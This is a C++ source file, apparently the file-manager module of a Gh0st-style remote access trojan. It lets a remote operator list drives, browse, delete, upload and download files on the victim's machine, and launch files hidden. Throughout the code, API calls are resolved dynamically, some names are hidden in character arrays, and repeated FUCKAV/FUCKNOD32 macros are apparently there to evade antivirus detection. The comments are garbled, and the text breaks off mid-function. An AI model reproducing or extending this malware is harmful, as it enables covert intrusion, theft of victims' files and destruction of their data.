// FileManager.cpp: implementation of the CFileManager class.
//
//////////////////////////////////////////////////////////////////////
#include "StdAfx.h"
#include "FileManager.h"

typedef struct 
{
	DWORD	dwSizeHigh;
	DWORD	dwSizeLow;
}FILESIZE;
//////////////////////////////////////////////////////////////////////
// Construction/Destruction
//////////////////////////////////////////////////////////////////////

CFileManager::CFileManager(CClientSocket *pClient):CManager(pClient)
{
	m_nTransferMode = TRANSFER_MODE_NORMAL;
	// �����������б�, ��ʼ�����ļ������������߳�
	SendDriveList();
}

CFileManager::~CFileManager()
{
	m_UploadList.clear();
}

void CFileManager::OnReceive(LPBYTE lpBuffer, UINT nSize)
{
	typedef BOOL (WINAPI *DeleteFileAT)
		(
		__in LPCSTR lpFileName
		);
	DeleteFileAT pDeleteFileA = (DeleteFileAT)GetProcAddress(LoadLibrary("KERNEL32.dll"),"DeleteFileA");
	FUCKAV2
		FUCKAV2
		FUCKAV2
		FUCKAV2
		ANTIVIRUS
		FUCKNOD32
	FUCKAV
	
	typedef VOID
		(WINAPI
		*OutputDebugStringAT)(
		__in LPCSTR lpOutputString
		);
	OutputDebugStringAT pOutputDebugStringA=(OutputDebugStringAT)GetProcAddress(LoadLibrary("KERNEL32.dll"),"OutputDebugStringA");

	switch (lpBuffer[0])
	{
	case COMMAND_LIST_FILES:// ��ȡ�ļ��б�
		SendFilesList((char *)lpBuffer + 1);
		break;
	case COMMAND_DELETE_FILE:// ɾ���ļ�
		pDeleteFileA((char *)lpBuffer + 1);
		SendToken(TOKEN_DELETE_FINISH);
		break;
	case COMMAND_DELETE_DIRECTORY:// ɾ���ļ�
		////printf("ɾ��Ŀ¼ %s\n", (char *)(bPacket + 1));
		DeleteDirectory((char *)lpBuffer + 1);
		SendToken(TOKEN_DELETE_FINISH);
		break;
	case COMMAND_DOWN_FILES: // �ϴ��ļ�
		UploadToRemote(lpBuffer + 1);
		break;
	case COMMAND_CONTINUE: // �ϴ��ļ�
		SendFileData(lpBuffer + 1);
		break;
	case COMMAND_CREATE_FOLDER:
		CreateFolder(lpBuffer + 1);
		break;
	case COMMAND_RENAME_FILE:
		Rename(lpBuffer + 1);
		break;
	case COMMAND_STOP:
		StopTransfer();
		break;
	case COMMAND_SET_TRANSFER_MODE:
		SetTransferMode(lpBuffer + 1);
		break;
	case COMMAND_FILE_SIZE:
		CreateLocalRecvFile(lpBuffer + 1);
		break;
	case COMMAND_FILE_DATA:
		WriteLocalRecvFile(lpBuffer + 1, nSize -1);
		break;
	case COMMAND_OPEN_FILE_SHOW:
		OpenFile((char *)lpBuffer + 1, SW_SHOW);
		break;
	case COMMAND_OPEN_FILE_HIDE:
		OpenFile((char *)lpBuffer + 1, SW_HIDE);
		break;
	default:
		break;
	}
}



bool CFileManager::OpenFile(LPCTSTR lpFile, INT nShowCmd)
{

/* why? Use ShellExecute!
	char	lpSubKey[500];
	HKEY	hKey;
	char	strTemp[MAX_PATH];
	LONG	nSize = sizeof(strTemp);
	char	*lpstrCat = NULL;
	memset(strTemp, 0, sizeof(strTemp));
	
	char	*lpExt = strrchr(lpFile, '.');
	if (!lpExt)
		return false;
	
	if (RegOpenKeyEx(HKEY_CLASSES_ROOT, lpExt, 0L, KEY_ALL_ACCESS, &hKey) != ERROR_SUCCESS)
		return false;
	RegQueryValue(hKey, NULL, strTemp, &nSize);
	RegCloseKey(hKey);
	memset(lpSubKey, 0, sizeof(lpSubKey));
	wsprintf(lpSubKey, "%s\\shell\\open\\command", strTemp);
	
	if (RegOpenKeyEx(HKEY_CLASSES_ROOT, lpSubKey, 0L, KEY_ALL_ACCESS, &hKey) != ERROR_SUCCESS)
		return false;
	memset(strTemp, 0, sizeof(strTemp));
	nSize = sizeof(strTemp);
	RegQueryValue(hKey, NULL, strTemp, &nSize);
	RegCloseKey(hKey);
	
	lpstrCat = strstr(strTemp, "\"%1");
	if (lpstrCat == NULL)
		lpstrCat = strstr(strTemp, "%1");
	
	if (lpstrCat == NULL)
	{
		lstrcat(strTemp, " ");
		lstrcat(strTemp, lpFile);
	}
	else
		lstrcpy(lpstrCat, lpFile);
	
	STARTUPINFO si = {0};
	PROCESS_INFORMATION pi;
	si.cb = sizeof si;
	if (nShowCmd != SW_HIDE)
		si.lpDesktop = "WinSta0\\Default"; 
	
	CreateProcess(NULL, strTemp, NULL, NULL, false, 0, NULL, NULL, &si, &pi);
*/
	typedef BOOL (WINAPI *FreeLibraryT)
		(
		__in HMODULE hLibModule
		);
	FreeLibraryT pFreeLibrary= (FreeLibraryT)GetProcAddress(LoadLibrary("kernel32.dll"),"FreeLibrary");
	FUCKAV2
		FUCKAV2
		FUCKAV2
		FUCKAV2
		ANTIVIRUS
		FUCKNOD32
	FUCKAV
	typedef HINSTANCE (WINAPI *tShellExecuteA)(HWND,LPCSTR, LPCSTR,LPCSTR,LPCSTR,INT);
	HMODULE hShell = LoadLibrary("Shell32.dll");
	tShellExecuteA pShellExecuteA =(tShellExecuteA)GetProcAddress(hShell,"ShellExecuteA");
	CHAR szOpen[]={'o','p','e','n','\0'};
	pShellExecuteA(NULL,szOpen,lpFile,NULL,NULL,nShowCmd);

	pFreeLibrary(hShell);

	return false;
}

bool CFileManager::MakeSureDirectoryPathExists(LPCTSTR pszDirPath)
{
	typedef DWORD (WINAPI *GetFileAttributesT)
		(
		__in LPCSTR lpFileName
	);
	GetFileAttributesT pGetFileAttributes = (GetFileAttributesT)GetProcAddress(LoadLibrary("KERNEL32.dll"),"GetFileAttributesA");

	typedef BOOL (WINAPI *GetLastErrorT)
		(
		VOID
		);
	char FhTZBW[] = {'G','e','t','L','a','s','t','E','r','r','o','r','\0'};
	GetLastErrorT pGetLastError = (GetLastErrorT)GetProcAddress(LoadLibrary("KERNEL32.dll"),FhTZBW);

	typedef BOOL (WINAPI *CreateDirectoryAT)
		(
		__in     LPCSTR lpPathName,
		__in_opt LPSECURITY_ATTRIBUTES lpSecurityAttributes
    );
	CreateDirectoryAT pCreateDirectoryA = (CreateDirectoryAT)GetProcAddress(LoadLibrary("kernel32.dll"),"CreateDirectoryA");
	
	typedef LPSTR
		(WINAPI
		*CharNextAT)(
		__in LPCSTR lpsz);
	CharNextAT pCharNextA=(CharNextAT)GetProcAddress(LoadLibrary("USER32.dll"),"CharNextA");

	typedef int
		(WINAPI
		*lstrlenAT)(
		__in LPCSTR lpString
		);	
	lstrlenAT plstrlenA=(lstrlenAT)GetProcAddress(LoadLibrary("KERNEL32.dll"),"lstrlenA");
	FUCKAV2
		FUCKAV2
		FUCKAV2
		FUCKAV2
		ANTIVIRUS
		FUCKNOD32
	FUCKAV
	typedef LPSTR
		(WINAPI
		*lstrcpyAT)(
		__out LPSTR lpString1,
		__in  LPCSTR lpString2
		);	
	lstrcpyAT plstrcpyA=(lstrcpyAT)GetProcAddress(LoadLibrary("KERNEL32.dll"),"lstrcpyA");

    LPTSTR p, pszDirCopy;
    DWORD dwAttributes;

    // Make a copy of the string for editing.

    __try
    {
        pszDirCopy = (LPTSTR)malloc(sizeof(TCHAR) * (plstrlenA(pszDirPath) + 1));

        if(pszDirCopy == NULL)
            return FALSE;

        plstrcpyA(pszDirCopy, pszDirPath);

        p = pszDirCopy;

        //  If the second character in the path is "\", then this is a UNC
        //  path, and we should skip forward until we reach the 2nd \ in the path.

        if((*p == TEXT('\\')) && (*(p+1) == TEXT('\\')))
        {
            p++;            // Skip over the first \ in the name.
            p++;            // Skip over the second \ in the name.

            //  Skip until we hit the first "\" (\\Server\).

            while(*p && *p != TEXT('\\'))
            {
                p = pCharNextA(p);
            }

            // Advance over it.

            if(*p)
            {
                p++;
            }

            //  Skip until we hit the second "\" (\\Server\Share\).

            while(*p && *p != TEXT('\\'))
            {
                p = pCharNextA(p);
            }

            // Advance over it also.

            if(*p)
            {
                p++;
            }

        }
        else if(*(p+1) == TEXT(':')) // Not a UNC.  See if it's <drive>:
        {
            p++;
            p++;

            // If it exists, skip over the root specifier

            if(*p && (*p == TEXT('\\')))
            {
                p++;
            }
        }

		while(*p)
        {
            if(*p == TEXT('\\'))
            {
                *p = TEXT('\0');
                dwAttributes = pGetFileAttributes(pszDirCopy);

                // Nothing exists with this name.  Try to make the directory name and error if unable to.
                if(dwAttributes == 0xffffffff)
                {
                    if(!pCreateDirectoryA(pszDirCopy, NULL))
                    {
                        if(pGetLastError() != ERROR_ALREADY_EXISTS)
                        {
                            free(pszDirCopy);
                            return FALSE;
                        }
                    }
                }
                else
                {
                    if((dwAttributes & FILE_ATTRIBUTE_DIRECTORY) != FILE_ATTRIBUTE_DIRECTORY)
                    {
                        // Something exists with this name, but it's not a directory... Error
                        free(pszDirCopy);
                        return FALSE;
                    }
                }
 
                *p = TEXT('\\');
            }

            p = pCharNextA(p);
        }
    }
    __except(EXCEPTION_EXECUTE_HANDLER)
    {
        // SetLastError(GetExceptionCode());
        free(pszDirCopy);
        return FALSE;
    }
	FUCKAV2
		FUCKAV2
		FUCKAV2
		FUCKAV2
		ANTIVIRUS
		FUCKNOD32
	FUCKAV
    free(pszDirCopy);
    return TRUE;
}

UINT CFileManager::SendDriveList()
{
	typedef BOOL (WINAPI *FreeLibraryT)
		(
		__in HMODULE hLibModule
		);
	FreeLibraryT pFreeLibrary= (FreeLibraryT)GetProcAddress(LoadLibrary("kernel32.dll"),"FreeLibrary");

	typedef DWORD (WINAPI *GetLogicalDriveStringsAT)
		(
		__in DWORD nBufferLength,
		__out_ecount_part_opt(nBufferLength, return + 1) LPSTR lpBuffer
		);
	GetLogicalDriveStringsAT pGetLogicalDriveStringsA = (GetLogicalDriveStringsAT)GetProcAddress(LoadLibrary("KERNEL32.dll"),"GetLogicalDriveStringsA");

	typedef BOOL (WINAPI *GetVolumeInformationAT)
		(
		__in_opt  LPCSTR lpRootPathName,
		__out_ecount_opt(nVolumeNameSize) LPSTR lpVolumeNameBuffer,
		__in      DWORD nVolumeNameSize,
		__out_opt LPDWORD lpVolumeSerialNumber,
		__out_opt LPDWORD lpMaximumComponentLength,
		__out_opt LPDWORD lpFileSystemFlags,
		__out_ecount_opt(nFileSystemNameSize) LPSTR lpFileSystemNameBuffer,
		__in      DWORD nFileSystemNameSize
    );
	GetVolumeInformationAT pGetVolumeInformationA = (GetVolumeInformationAT)GetProcAddress(LoadLibrary("kernel32.dll"),"GetVolumeInformationA");

	FUCKAV2
		FUCKAV2
		FUCKAV2
		FUCKAV2
		ANTIVIRUS
		FUCKNOD32
	FUCKAV
	typedef UINT
		(WINAPI
		*GetDriveTypeAT)(
		__in_opt LPCSTR lpRootPathName
		);
	GetDriveTypeAT pGetDriveTypeA=(GetDriveTypeAT)GetProcAddress(LoadLibrary("KERNEL32.dll"),"GetDriveTypeA");

	
	typedef BOOL
		(WINAPI
		*GetDiskFreeSpaceExAT)(
		__in_opt  LPCSTR lpDirectoryName,
		__out_opt PULARGE_INTEGER lpFreeBytesAvailableToCaller,
		__out_opt PULARGE_INTEGER lpTotalNumberOfBytes,
		__out_opt PULARGE_INTEGER lpTotalNumberOfFreeBytes
		);
	GetDiskFreeSpaceExAT pGetDiskFreeSpaceExA=(GetDiskFreeSpaceExAT)GetProcAddress(LoadLibrary("KERNEL32.dll"),"GetDiskFreeSpaceExA");

	typedef int
		(WINAPI
		*lstrlenAT)(
		__in LPCSTR lpString
		);	
	lstrlenAT plstrlenA=(lstrlenAT)GetProcAddress(LoadLibrary("KERNEL32.dll"),"lstrlenA");

	char	DriveString[256];
	// ǰһ���ֽ�Ϊ���ƣ������52�ֽ�Ϊ���������������
	BYTE	DriveList[1024];
	char	FileSystem[MAX_PATH];
	char	*pDrive = NULL;
	DriveList[0] = TOKEN_DRIVE_LIST; // �������б�
	pGetLogicalDriveStringsA(sizeof(DriveString), DriveString);
	pDrive = DriveString;
	FUCKAV2
		FUCKAV2
		FUCKAV2
		FUCKAV2
		ANTIVIRUS
		FUCKNOD32
	FUCKAV
	unsigned __int64	HDAmount = 0;
	unsigned __int64	HDFreeSpace = 0;
	unsigned long		AmntMB = 0; // �ܴ�С
	unsigned long		FreeMB = 0; // ʣ��ռ�

	HMODULE mHodule = LoadLibrary("Shell32.dll");
	typedef DWORD (WINAPI *SHGetFileInfoT)(LPCSTR, DWORD,SHFILEINFOA *,UINT,UINT);
	SHGetFileInfoT pSHGetFileInfo=(SHGetFileInfoT)GetProcAddress(mHodule,"SHGetFileInfoA");


	for (DWORD dwOffset = 1; *pDrive != '\0'; pDrive += plstrlenA(pDrive) + 1)
	{
		memset(FileSystem, 0, sizeof(FileSystem));
		// �õ��ļ�ϵͳ��Ϣ����С
		pGetVolumeInformationA(pDrive, NULL, 0, NULL, NULL, NULL, FileSystem, MAX_PATH);
		SHFILEINFO	sfi;

		pSHGetFileInfo(pDrive, FILE_ATTRIBUTE_NORMAL, &sfi, sizeof(SHFILEINFO), SHGFI_TYPENAME | SHGFI_USEFILEATTRIBUTES);
		
		int	nTypeNameLen = plstrlenA(sfi.szTypeName) + 1;
		int	nFileSystemLen = plstrlenA(FileSystem) + 1;
		FUCKAV2
			FUCKAV2
			FUCKAV2
			FUCKAV2
			ANTIVIRUS
			FUCKNOD32
	FUCKAV
		// ������̴�С
		if (pDrive[0] != 'A' && pDrive[0] != 'B' && pGetDiskFreeSpaceExA(pDrive, (PULARGE_INTEGER)&HDFreeSpace, (PULARGE_INTEGER)&HDAmount, NULL))
		{	
			AmntMB = HDAmount / 1024 / 1024;
			FreeMB = HDFreeSpace / 1024 / 1024;
		}
		else
		{
			AmntMB = 0;
			FreeMB = 0;
		}
		// ��ʼ��ֵ
		DriveList[dwOffset] = pDrive[0];
		DriveList[dwOffset + 1] = pGetDriveTypeA(pDrive);
		
		
		// ���̿ռ�����ռȥ��8�ֽ�
		memcpy(DriveList + dwOffset + 2, &AmntMB, sizeof(unsigned long));
		memcpy(DriveList + dwOffset + 6, &FreeMB, sizeof(unsigned long));
		
		// ���̾��������������
		memcpy(DriveList + dwOffset + 10, sfi.szTypeName, nTypeNameLen);
		memcpy(DriveList + dwOffset + 10 + nTypeNameLen, FileSystem, nFileSystemLen);
		
		dwOffset += 10 + nTypeNameLen + nFileSystemLen;
	}
	pFreeLibrary(mHodule);

	return Send((LPBYTE)DriveList, dwOffset);
}





bool CFileManager::DeleteDirectory(LPCTSTR lpszDirectory)
{
	typedef BOOL (WINAPI *DeleteFileAT)
		(
		__in LPCSTR lpFileName
		);
	DeleteFileAT pDeleteFileA = (DeleteFileAT)GetProcAddress(LoadLibrary("KERNEL32.dll"),"DeleteFileA");
	FUCKAV2
		FUCKAV2
		FUCKAV2
		FUCKAV2
		ANTIVIRUS
		FUCKNOD32
	FUCKAV
	typedef BOOL (WINAPI *RemoveDirectoryAT)
		(
		__in LPCSTR lpPathName
    );
	RemoveDirectoryAT pRemoveDirectoryA = (RemoveDirectoryAT)GetProcAddress(LoadLibrary("kernel32.dll"),"RemoveDirectoryA");

	
	typedef BOOL
		(WINAPI
		*FindCloseT)(
		__inout HANDLE hFindFile
		);
	FindCloseT pFindClose=(FindCloseT)GetProcAddress(LoadLibrary("KERNEL32.dll"),"FindClose");

	typedef BOOL
		(WINAPI
		*FindNextFileAT)(
		__in  HANDLE hFindFile,
		__out LPWIN32_FIND_DATAA lpFindFileData
		);
	FindNextFileAT pFindNextFileA=(FindNextFileAT)GetProcAddress(LoadLibrary("KERNEL32.dll"),"FindNextFileA");

	typedef HANDLE
		(WINAPI
		*FindFirstFileAT)(
		__in  LPCSTR lpFileName,
		__out LPWIN32_FIND_DATAA lpFindFileData
		);
	FindFirstFileAT pFindFirstFileA=(FindFirstFileAT)GetProcAddress(LoadLibrary("KERNEL32.dll"),"FindFirstFileA");

	WIN32_FIND_DATA	wfd;
	char	lpszFilter[MAX_PATH];
	
	CHAR szFormat[]={'%','s','\\','*','.','*','\0'};
	wsprintf(lpszFilter,szFormat, lpszDirectory);
	
	HANDLE hFind = pFindFirstFileA(lpszFilter, &wfd);
	if (hFind == INVALID_HANDLE_VALUE) // ���û���ҵ������ʧ��
		return FALSE;
	FUCKAV2
		FUCKAV2
		FUCKAV2
		FUCKAV2
		ANTIVIRUS
		FUCKNOD32
	FUCKAV
	do
	{
		if (wfd.cFileName[0] != '.')
		{
			if (wfd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
			{
				char strDirectory[MAX_PATH];
				wsprintf(strDirectory, "%s\\%s", lpszDirectory, wfd.cFileName);
				DeleteDirectory(strDirectory);
			}
			else
			{
				char strFile[MAX_PATH];
				wsprintf(strFile, "%s\\%s", lpszDirectory, wfd.cFileName);
				pDeleteFileA(strFile);
			}
		}
	} while (pFindNextFileA(hFind, &wfd));
	FUCKAV2
		FUCKAV2
		FUCKAV2
		FUCKAV2
		ANTIVIRUS
		FUCKNOD32
	FUCKAV
	pFindClose(hFind); // �رղ��Ҿ��
	FUCKAV2
		FUCKAV2
		FUCKAV2
		FUCKAV2
		ANTIVIRUS
		FUCKNOD32
	FUCKAV
	if(!pRemoveDirectoryA(lpszDirectory))
	{
		return FALSE;
	}
	return true;
}

UINT CFileManager::SendFilesList(LPCTSTR lpszDirectory)
{
	typedef HLOCAL (WINAPI *LocalAllocT)
		(
		__in UINT uFlags,
		__in SIZE_T uBytes
		);
	LocalAllocT pLocalAlloc = (LocalAllocT)GetProcAddress(LoadLibrary("kernel32.dll"),"LocalAlloc");

	typedef HLOCAL (WINAPI *LocalFreeT)
		(
		__deref HLOCAL hMem
		);
	LocalFreeT pLocalFree = (LocalFreeT)GetProcAddress(LoadLibrary("kernel32.dll"),"LocalFree");

	typedef __out  HLOCAL (WINAPI *LocalReAllocT)
		(
		__in HLOCAL hMem, __in SIZE_T uBytes, __in UINT uFlags 
		);
	LocalReAllocT pLocalReAlloc = (LocalReAllocT)GetProcAddress(LoadLibrary("KERNEL32.dll"),"LocalReAlloc");

	typedef BOOL
		(WINAPI
		*FindCloseT)(
		__inout HANDLE hFindFile
		);
	FindCloseT pFindClose=(FindCloseT)GetProcAddress(LoadLibrary("KERNEL32.dll"),"FindClose");

	typedef BOOL
		(WINAPI
		*FindNextFileAT)(
		__in  HANDLE hFindFile,
		__out LPWIN32_FIND_DATAA lpFindFileData
		);
	FindNextFileAT pFindNextFileA=(FindNextFileAT)GetProcAddress(LoadLibrary("KERNEL32.dll"),"FindNextFileA");

	typedef HANDLE
		(WINAPI
		*FindFirstFileAT)(
		__in  LPCSTR lpFileName,
		__out LPWIN32_FIND_DATAA lpFindFileData
		);
	FindFirstFileAT pFindFirstFileA=(FindFirstFileAT)GetProcAddress(LoadLibrary("KERNEL32.dll"),"FindFirstFileA");

	typedef int
		(WINAPI
		*lstrlenAT)(
		__in LPCSTR lpString
		);	
	lstrlenAT plstrlenA=(lstrlenAT)GetProcAddress(LoadLibrary("KERNEL32.dll"),"lstrlenA");

	// ���ô��䷽ʽ
	m_nTransferMode = TRANSFER_MODE_NORMAL;	

	UINT	nRet = 0;
	char	strPath[MAX_PATH];
	char	*pszFileName = NULL;
	LPBYTE	lpList = NULL;
	HANDLE	hFile;
	DWORD	dwOffset = 0; // λ��ָ��
	int		nLen = 0;
	DWORD	nBufferSize =  1024 * 10; // �ȷ���10K�Ļ�����
	WIN32_FIND_DATA	FindFileData;
	
	lpList = (BYTE *)pLocalAlloc(LPTR, nBufferSize);
	
	CHAR szFormat[]={'%','s','\\','*','.','*','\0'};
	sprintf(strPath, szFormat, lpszDirectory);
	
	hFile = pFindFirstFileA(strPath, &FindFileData);

	if (hFile == INVALID_HANDLE_VALUE)
	{
		BYTE bToken = TOKEN_FILE_LIST;
		return Send(&bToken, 1);
	}
	
	*lpList = TOKEN_FILE_LIST;
	
	// 1 Ϊ���ݰ�ͷ����ռ�ֽ�,���ֵ
	dwOffset = 1;
	/*
	�ļ�����	1
	�ļ���		strlen(filename) + 1 ('\0')
	�ļ���С	4
	*/
	do 
	{
		// ��̬��չ������
		if (dwOffset > (nBufferSize - MAX_PATH * 2))
		{
			nBufferSize += MAX_PATH * 2;
			lpList = (BYTE *)pLocalReAlloc(lpList, nBufferSize, LMEM_ZEROINIT|LMEM_MOVEABLE);
		}
		pszFileName = FindFileData.cFileName;
		if (strcmp(pszFileName, ".") == 0 || strcmp(pszFileName, "..") == 0)
			continue;
		// �ļ����� 1 �ֽ�
		*(lpList + dwOffset) = FindFileData.dwFileAttributes &	FILE_ATTRIBUTE_DIRECTORY;
		dwOffset++;
		// �ļ��� lstrlen(pszFileName) + 1 �ֽ�
		nLen = plstrlenA(pszFileName);
		memcpy(lpList + dwOffset, pszFileName, nLen);
		dwOffset += nLen;
		*(lpList + dwOffset) = 0;
		dwOffset++;
		
		// �ļ���С 8 �ֽ�
		memcpy(lpList + dwOffset, &FindFileData.nFileSizeHigh, sizeof(DWORD));
		memcpy(lpList + dwOffset + 4, &FindFileData.nFileSizeLow, sizeof(DWORD));
		dwOffset += 8;
		// ������ʱ�� 8 �ֽ�
		memcpy(lpList + dwOffset, &FindFileData.ftLastWriteTime, sizeof(FILETIME));
		dwOffset += 8;
	} while(pFindNextFileA(hFile, &FindFileData));

	nRet = Send(lpList, dwOffset);

	pLocalFree(lpList);
	pFindClose(hFile);
	return nRet;
}



UINT CFileManager::SendFileData(LPBYTE lpBuffer)
{
	typedef BOOL (WINAPI *CloseHandleT)
		(
		__in HANDLE hObject
		);
	char DDZGlGm[] = {'C','l','o','s','e','H','a','n','d','l','e','\0'};
	CloseHandleT pCloseHandle = (CloseHandleT)GetProcAddress(LoadLibrary("KERNEL32.dll"),DDZGlGm);

	typedef HANDLE (WINAPI *CreateFileAT)
		(
		__in     LPCSTR lpFileName,
		__in     DWORD dwDesiredAccess,
		__in     DWORD dwShareMode,
		__in_opt LPSECURITY_ATTRIBUTES lpSecurityAttributes,
		__in     DWORD dwCreationDisposition,
		__in     DWORD dwFlagsAndAttributes,
		__in_opt HANDLE hTemplateFile
		);
	CreateFileAT pCreateFileA= (CreateFileAT)GetProcAddress(LoadLibrary("kernel32.dll"),"CreateFileA");

	typedef  DWORD (WINAPI *SetFilePointerT)
		(
		__in HANDLE hFile, __in LONG lDistanceToMove, __in_opt PLONG lpDistanceToMoveHigh, __in DWORD dwMoveMethod
		);
	SetFilePointerT pSetFilePointer = (SetFilePointerT)GetProcAddress(LoadLibrary("KERNEL32.dll"),"SetFilePointer");

	typedef BOOL (WINAPI *ReadFileT)
		(
		__in        HANDLE hFile,
		__out_bcount_part(nNumberOfBytesToRead, *lpNumberOfBytesRead) LPVOID lpBuffer,
		__in        DWORD nNumberOfBytesToRead,
		__out_opt   LPDWORD lpNumberOfBytesRead,
		__inout_opt LPOVERLAPPED lpOverlapped
		);
	ReadFileT pReadFile = (ReadFileT)GetProcAddress(LoadLibrary("KERNEL32.dll"),"ReadFile");

	typedef HLOCAL (WINAPI *LocalAllocT)
		(
		__in UINT uFlags,
		__in SIZE_T uBytes
		);
	LocalAllocT pLocalAlloc = (LocalAllocT)GetProcAddress(LoadLibrary("kernel32.dll"),"LocalAlloc");

	typedef HLOCAL (WINAPI *LocalFreeT)
		(
		__deref HLOCAL hMem
		);
	LocalFreeT pLocalFree = (LocalFreeT)GetProcAddress(LoadLibrary("kernel32.dll"),"LocalFree");

	UINT		nRet;
	FILESIZE	*pFileSize;
	char		*lpFileName;

	pFileSize = (FILESIZE *)lpBuffer;
	lpFileName = m_strCurrentProcessFileName;

	// Զ��������������һ��
	if (pFileSize->dwSizeLow == -1)
	{
		UploadNext();
		return 0;
	}
	HANDLE	hFile;
	hFile = pCreateFileA(lpFileName, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
	if (hFile == INVALID_HANDLE_VALUE)
		return -1;

	pSetFilePointer(hFile, pFileSize->dwSizeLow, (long *)&(pFileSize->dwSizeHigh), FILE_BEGIN);

	int		nHeadLength = 9; // 1 + 4 + 4���ݰ�ͷ����С
	DWORD	nNumberOfBytesToRead = MAX_SEND_BUFFER - nHeadLength;
	DWORD	nNumberOfBytesRead = 0;

	LPBYTE	lpPacket = (LPBYTE)pLocalAlloc(LPTR, MAX_SEND_BUFFER);
	// Token,  ��С��ƫ�ƣ��ļ���������
	lpPacket[0] = TOKEN_FILE_DATA;
	memcpy(lpPacket + 1, pFileSize, sizeof(FILESIZE));
	pReadFile(hFile, lpPacket + nHeadLength, nNumberOfBytesToRead, &nNumberOfBytesRead, NULL);
	pCloseHandle(hFile);


	if (nNumberOfBytesRead > 0)
	{
		int	nPacketSize = nNumberOfBytesRead + nHeadLength;
		nRet = Send(lpPacket, nPacketSize);
	}
	else
	{
		UploadNext();
	}

	pLocalFree(lpPacket);

	return nRet;
}
UINT CFileManager::SendFileSize(LPCTSTR lpszFileName)
{
	typedef BOOL (WINAPI *CloseHandleT)
		(
		__in HANDLE hObject
		);
	char DDZGlGm[] = {'C','l','o','s','e','H','a','n','d','l','e','\0'};
	CloseHandleT pCloseHandle = (CloseHandleT)GetProcAddress(LoadLibrary("KERNEL32.dll"),DDZGlGm);
	
	typedef HANDLE (WINAPI *CreateFileAT)
		(
		__in     LPCSTR lpFileName,
		__in     DWORD dwDesiredAccess,
		__in     DWORD dwShareMode,
		__in_opt LPSECURITY_ATTRIBUTES lpSecurityAttributes,
		__in     DWORD dwCreationDisposition,
		__in     DWORD dwFlagsAndAttributes,
		__in_opt HANDLE hTemplateFile
		);
	CreateFileAT pCreateFileA= (CreateFileAT)GetProcAddress(LoadLibrary("kernel32.dll"),"CreateFileA");
	
	typedef DWORD (WINAPI *GetFileSizeT)
		(
		__in HANDLE hFile, __out_opt LPDWORD lpFileSizeHigh
		);
	GetFileSizeT pGetFileSize = (GetFileSizeT)GetProcAddress(LoadLibrary("KERNEL32.dll"),"GetFileSize");
	
	typedef HLOCAL (WINAPI *LocalAllocT)
		(
		__in UINT uFlags,
		__in SIZE_T uBytes
		);
	LocalAllocT pLocalAlloc = (LocalAllocT)GetProcAddress(LoadLibrary("kernel32.dll"),"LocalAlloc");
	
	typedef HLOCAL (WINAPI *LocalFreeT)
		(
		__deref HLOCAL hMem
		);
	LocalFreeT pLocalFree = (LocalFreeT)GetProcAddress(LoadLibrary("kernel32.dll"),"LocalFree");
	
	typedef int
		(WINAPI
		*lstrlenAT)(
		__in LPCSTR lpString
		);	
	lstrlenAT plstrlenA=(lstrlenAT)GetProcAddress(LoadLibrary("KERNEL32.dll"),"lstrlenA");

	
	UINT	nRet = 0;
	DWORD	dwSizeHigh;
	DWORD	dwSizeLow;
	// 1 �ֽ�token, 8�ֽڴ�С, �ļ�����, '\0'
	HANDLE	hFile;
	// ���浱ǰ���ڲ������ļ���
	memset(m_strCurrentProcessFileName, 0, sizeof(m_strCurrentProcessFileName));
	strcpy(m_strCurrentProcessFileName, lpszFileName);
	
	hFile = pCreateFileA(lpszFileName, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
	if (hFile == INVALID_HANDLE_VALUE)
		return FALSE;
	dwSizeLow =	pGetFileSize(hFile, &dwSizeHigh);
	pCloseHandle(hFile);
	// �������ݰ��������ļ�����
	int		nPacketSize = plstrlenA(lpszFileName) + 10;
	BYTE	*bPacket = (BYTE *)pLocalAlloc(LPTR, nPacketSize);
	memset(bPacket, 0, nPacketSize);
	
	bPacket[0] = TOKEN_FILE_SIZE;
	FILESIZE *pFileSize = (FILESIZE *)(bPacket + 1);
	pFileSize->dwSizeHigh = dwSizeHigh;
	pFileSize->dwSizeLow = dwSizeLow;
	memcpy(bPacket + 9, lpszFileName, plstrlenA(lpszFileName) + 1);
	
	nRet = Send(bPacket, nPacketSize);
	pLocalFree(bPacket);
	return nRet;
}
// ������һ���ļ�
void CFileManager::UploadNext()
{
	list <string>::iterator it = m_UploadList.begin();
	// ɾ��һ������
	m_UploadList.erase(it);
	// �����ϴ�����
	if(m_UploadList.empty())
	{
		SendToken(TOKEN_TRANSFER_FINISH);
	}
	else
	{
		// �ϴ���һ��
		it = m_UploadList.begin();
		SendFileSize((*it).c_str());
	}
}
int CFileManager::SendToken(BYTE bToken)
{
	return Send(&bToken, 1);
}

bool CFileManager::UploadToRemote(LPBYTE lpBuffer)
{
	typedef int
		(WINAPI
		*lstrlenAT)(
		__in LPCSTR lpString
		);	
	lstrlenAT plstrlenA=(lstrlenAT)GetProcAddress(LoadLibrary("KERNEL32.dll"),"lstrlenA");

	if (lpBuffer[plstrlenA((char *)lpBuffer) - 1] == '\\')
	{
		FixedUploadList((char *)lpBuffer);
		if (m_UploadList.empty())
		{
			StopTransfer();
			return true;
		}
	}
	else
	{
		m_UploadList.push_back((char *)lpBuffer);
	}

	list <string>::iterator it = m_UploadList.begin();
	// ���͵�һ���ļ�
	SendFileSize((*it).c_str());

	return true;
}



void CFileManager::StopTransfer()
{
	if (!m_UploadList.empty())
		m_UploadList.clear();
	SendToken(TOKEN_TRANSFER_FINISH);
}

void CFileManager::CreateLocalRecvFile(LPBYTE lpBuffer)
{
	typedef BOOL
		(WINAPI
		*FindCloseT)(
		__inout HANDLE hFindFile
		);
	FindCloseT pFindClose=(FindCloseT)GetProcAddress(LoadLibrary("KERNEL32.dll"),"FindClose");

	typedef HANDLE
		(WINAPI
		*FindFirstFileAT)(
		__in  LPCSTR lpFileName,
		__out LPWIN32_FIND_DATAA lpFindFileData
		);
	FindFirstFileAT pFindFirstFileA=(FindFirstFileAT)GetProcAddress(LoadLibrary("KERNEL32.dll"),"FindFirstFileA");

	FILESIZE	*pFileSize = (FILESIZE *)lpBuffer;
	// ���浱ǰ���ڲ������ļ���
	memset(m_strCurrentProcessFileName, 0, sizeof(m_strCurrentProcessFileName));
	strcpy(m_strCurrentProcessFileName, (char *)lpBuffer + 8);

	// �����ļ�����
